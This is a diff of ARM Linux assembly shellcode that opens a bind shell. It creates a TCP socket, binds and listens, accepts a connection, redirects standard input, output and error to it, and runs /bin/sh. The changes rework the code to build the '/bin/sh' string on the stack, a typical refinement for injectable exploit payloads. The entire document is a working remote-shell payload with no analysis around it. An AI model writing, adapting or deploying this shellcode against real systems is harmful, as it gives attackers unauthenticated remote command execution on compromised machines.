@@ -13,6 +13,8 @@ _start:
     .code 32
     ldr    r7, =#281
     ldr    r4, =#0xD402FF02 
+    ldr    r5, =#0x6e69622f // /bin
+    ldr    r6, =#0x68732f2f // //sh
     add    r3, pc, #1
     bx     r3 
   
@@ -23,10 +25,9 @@ _start:
     mov    r0, #2       // r0 = AF_INET
     svc    1
     
-    mov    r6, r0       // r6 = s
+    mov    r8, r0       // r8 = s
     
-    // bind(s, &sa, sizeof(sa));  
-    //adr    r1, sa       // r1 = &sa
+    // bind(s, &sa, sizeof(sa)); 
     mov    r1, r4 
     push   {r1, r2}
     mov    r1, sp
@@ -36,38 +37,35 @@ _start:
     svc    1
   
     // listen(s, 0);
-    mov    r1, #1   // r1 = 0    
-    mov    r0, r6
+    mov    r1, #1       // r1 = 1    
+    mov    r0, r8       // r0 = s
     add    r7, #2       // r7 = 282+2 = 284 = listen 
     svc    1    
     
     // r = accept(s, 0, 0);
     eor    r2, r2, r2   // r2 = 0
     eor    r1, r1, r1   // r1 = 0
-    mov    r0, r6       // r0 = s
+    mov    r0, r8       // r0 = s
     add    r7, #1       // r7 = 284+1 = 285 = accept    
     svc    1    
     
-    mov    r6, r0       // r7 = r
+    mov    r8, r0       // r8 = r
     
     // dup2(r, FILENO_STDIN);
     // dup2(r, FILENO_STDOUT);
     // dup2(r, FILENO_STDERR);
     mov    r1, #2       // for 3 descriptors
-dup_loop:
-    mov    r7, #63      // r7 = dup 
-    mov    r0, r6       // r0 = r
+c_dup:
+    mov    r7, #63      // r7 = dup2 
+    mov    r0, r8       // r0 = r
     svc    1
     sub    r1, #1       // 
-    bpl    dup_loop
+    bpl    c_dup        // while (r1 >= 0)
 
-    // execve("/bin/sh", NULL, NULL);    
-    adr    r0, sh       // r0 = "/bin/sh" 
+    // execve("/bin/sh", NULL, NULL);
+    push   {r5, r6, r9}    
+    mov    r0, sp       // r0 = "/bin/sh" 
     eor    r2, r2, r2   // r2 = NULL
     eor    r1, r1, r1   // r1 = NULL
-    strb   r2, [r0, #7] // add null terminator    
     mov    r7, #11      // r7 = execve
     svc    1
-sh:    
-    .ascii "/bin/shX"
-
